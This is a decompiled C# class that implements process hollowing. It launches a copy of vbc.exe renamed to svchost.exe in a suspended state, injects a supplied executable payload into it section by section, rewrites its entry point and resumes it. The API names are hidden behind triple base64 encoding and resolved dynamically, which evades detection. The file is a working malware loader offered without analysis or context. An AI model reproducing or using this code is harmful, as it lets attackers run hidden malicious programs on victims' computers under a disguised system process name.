using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;

namespace ns2;

internal sealed class Class5
{
	[return: MarshalAs(UnmanagedType.Bool)]
	public delegate bool Delegate6(string nsaaayyxiwxutadgsaao, StringBuilder yaelgsyyuukztrqvair, IntPtr cewlzipzsvgyiztwik, IntPtr inwwxrwqidjqeuyxkood, [MarshalAs(UnmanagedType.Bool)] bool wfoojvvbbnglscgxq, int htielyvddfadkntgz, IntPtr kkrutwodeihptqjwli, string nxgstpofauhfcjreiroq, byte[] lzjgcropxjucjzhru, IntPtr[] cxdbudyylwvovpikzgvv);

	public delegate bool Delegate7(IntPtr yuzwfogugkwixqnjobdk, IntPtr jowpxdjwqjuhogqrsxds, byte[] fpvxezkbcdrynrvrklx, uint tfwyksabfcequuentfki, int rrrrxosenyejfsnirrhy);

	[return: MarshalAs(UnmanagedType.Bool)]
	public delegate bool Delegate8(IntPtr wlgtqbdqgafiolwkzl, IntPtr quvwthwwjgvuhokxneb, ref IntPtr fguxwzpiepjihakurkpf, int vcakrvbhvwhuceaqeqbu, ref IntPtr nivhjtjskikpvjlxrvo);

	public delegate IntPtr Delegate9(IntPtr rycgwwgxarrfkshx, IntPtr ngrjluldvckqlfxdksrq, IntPtr egwajgfjhhyytfppdpd, int etzcxkhoqqndxtcq, int zekzxizbzgnsrteh);

	public delegate uint Delegate10(IntPtr refofbikvwbahkwuclj, IntPtr vdeuadljhcapdowk);

	public delegate uint Delegate11(IntPtr ktiwqlouuqksitbffw);

	[return: MarshalAs(UnmanagedType.Bool)]
	public delegate bool Delegate12(IntPtr uqrghojzadnwzszlx, uint[] txepidslcgbqqzpghypo);

	[return: MarshalAs(UnmanagedType.Bool)]
	public delegate bool Delegate13(IntPtr kitzyvcnsktnehcwyq, uint[] hvcptjhuekktiephefbd);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr LoadLibraryA([MarshalAs(UnmanagedType.VBByRefStr)] ref string name);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr GetProcAddress(IntPtr handle, [MarshalAs(UnmanagedType.VBByRefStr)] ref string name);

	public static T smethod_0<T>(string string_0, string string_1)
	{
		return (T)(object)Marshal.GetDelegateForFunctionPointer(GetProcAddress(LoadLibraryA(ref string_0), ref string_1), typeof(T));
	}

	public static bool smethod_1(byte[] byte_0)
	{
		checked
		{
			try
			{
				string tempPath = Path.GetTempPath();
				try
				{
					File.Copy(Path.GetDirectoryName(Environment.SystemDirectory) + "\\Microsoft.NET\\Framework\\v2.0.50727\\vbc.exe", tempPath + "xcoca.ine", overwrite: true);
					((ServerComputer)Class1.smethod_0()).get_FileSystem().RenameFile(tempPath + "xcoca.ine", "svchost.exe");
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
				IntPtr zero = IntPtr.Zero;
				IntPtr[] array = new IntPtr[4];
				byte[] lzjgcropxjucjzhru = new byte[68];
				int num = BitConverter.ToInt32(byte_0, 60);
				Delegate6 @delegate = smethod_0<Delegate6>(smethod_2("WVRKV2VXSnRWbk5OZWtrOQ=="), smethod_2("VVROS2JGbFlVbXhWU0VwMldUSldlbU13UlQwPQ=="));
				int num2 = BitConverter.ToInt16(byte_0, num + 6);
				IntPtr intPtr = new IntPtr(BitConverter.ToInt32(byte_0, num + 84));
				Delegate12 delegate2 = smethod_0<Delegate12>(smethod_2("WVRKV2VXSnRWbk5OZWtrOQ=="), smethod_2("VWpKV01GWkhhSGxhVjBaclVUSTVkV1JIVmpSa1FUMDk="));
				if (@delegate(null, new StringBuilder(tempPath + "svchost.exe"), zero, zero, wfoojvvbbnglscgxq: false, 4, zero, null, lzjgcropxjucjzhru, array))
				{
					uint[] array2 = new uint[179];
					array2[0] = 65538u;
					Delegate10 delegate3 = smethod_0<Delegate10>(smethod_2("WW01U2EySkhkejA9"), smethod_2("VjI1a1ZtSnRNV2hqUmxwd1dsaGtVRnBzVG14Wk0xSndZakkwUFE9PQ=="));
					if (delegate2(array[1], array2))
					{
						IntPtr quvwthwwjgvuhokxneb = new IntPtr(unchecked((long)array2[41]) + 8L);
						IntPtr fguxwzpiepjihakurkpf = IntPtr.Zero;
						Delegate8 delegate4 = smethod_0<Delegate8>(smethod_2("WVRKV2VXSnRWbk5OZWtrOQ=="), smethod_2("VlcxV2FGcEdRbmxpTWs1c1l6Tk9UbHBYTVhaamJtczk="));
						IntPtr intPtr2 = new IntPtr(4);
						IntPtr nivhjtjskikpvjlxrvo = IntPtr.Zero;
						if (delegate4(array[0], quvwthwwjgvuhokxneb, ref fguxwzpiepjihakurkpf, (int)intPtr2, ref nivhjtjskikpvjlxrvo) && unchecked((long)delegate3(array[0], fguxwzpiepjihakurkpf)) == 0L)
						{
							IntPtr ngrjluldvckqlfxdksrq = new IntPtr(BitConverter.ToInt32(byte_0, num + 52));
							Delegate9 delegate5 = smethod_0<Delegate9>(smethod_2("WVRKV2VXSnRWbk5OZWtrOQ=="), smethod_2("Vm0xc2VXUklWbWhpUlVaellrYzVhbEpZWnowPQ=="));
							IntPtr jowpxdjwqjuhogqrsxds = delegate5(egwajgfjhhyytfppdpd: new IntPtr(BitConverter.ToInt32(byte_0, num + 80)), rycgwwgxarrfkshx: array[0], ngrjluldvckqlfxdksrq: ngrjluldvckqlfxdksrq, etzcxkhoqqndxtcq: 12288, zekzxizbzgnsrteh: 64);
							Delegate7 delegate6 = smethod_0<Delegate7>(smethod_2("WVRKV2VXSnRWbk5OZWtrOQ=="), smethod_2("VmpOS2NHUkhWbEZqYlRscVdsaE9lbFJYVm5SaU0wbzE="));
							int num3 = jowpxdjwqjuhogqrsxds.ToInt32();
							int rrrrxosenyejfsnirrhy = default(int);
							delegate6(array[0], jowpxdjwqjuhogqrsxds, byte_0, (uint)(int)intPtr, rrrrxosenyejfsnirrhy);
							int num4 = num2 - 1;
							int num5 = num4;
							for (int i = 0; i <= num5; i++)
							{
								int[] array3 = new int[10];
								Buffer.BlockCopy(byte_0, num + 248 + i * 40, array3, 0, 40);
								byte[] array4 = new byte[array3[4] - 1 + 1];
								Buffer.BlockCopy(byte_0, array3[5], array4, 0, array4.Length);
								delegate6(jowpxdjwqjuhogqrsxds: new IntPtr(num3 + array3[3]), tfwyksabfcequuentfki: (uint)(int)new IntPtr(array4.Length), yuzwfogugkwixqnjobdk: array[0], fpvxezkbcdrynrvrklx: array4, rrrrxosenyejfsnirrhy: rrrrxosenyejfsnirrhy);
							}
							IntPtr jowpxdjwqjuhogqrsxds3 = new IntPtr(unchecked((long)array2[41]) + 8L);
							ngrjluldvckqlfxdksrq = new IntPtr(4);
							Delegate13 delegate7 = smethod_0<Delegate13>(smethod_2("WVRKV2VXSnRWbk5OZWtrOQ=="), smethod_2("VlRKV01GWkhhSGxhVjBaclVUSTVkV1JIVmpSa1FUMDk="));
							delegate6(array[0], jowpxdjwqjuhogqrsxds3, BitConverter.GetBytes(jowpxdjwqjuhogqrsxds.ToInt32()), (uint)(int)ngrjluldvckqlfxdksrq, rrrrxosenyejfsnirrhy);
							array2[44] = (uint)(jowpxdjwqjuhogqrsxds.ToInt32() + BitConverter.ToInt32(byte_0, num + 40));
							delegate7(array[1], array2);
						}
					}
					Delegate11 delegate8 = smethod_0<Delegate11>(smethod_2("WVRKV2VXSnRWbk5OZWtrOQ=="), smethod_2("VlcxV2VtUlhNV3hXUjJoNVdsZEdhdz09"));
					delegate8(array[1]);
				}
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				bool result = false;
				ProjectData.ClearProjectError();
				return result;
			}
			return true;
		}
	}

	public static string smethod_2(string string_0)
	{
		string @string = Encoding.ASCII.GetString(Convert.FromBase64String(string_0));
		string string2 = Encoding.ASCII.GetString(Convert.FromBase64String(@string));
		return Encoding.ASCII.GetString(Convert.FromBase64String(string2));
	}
}
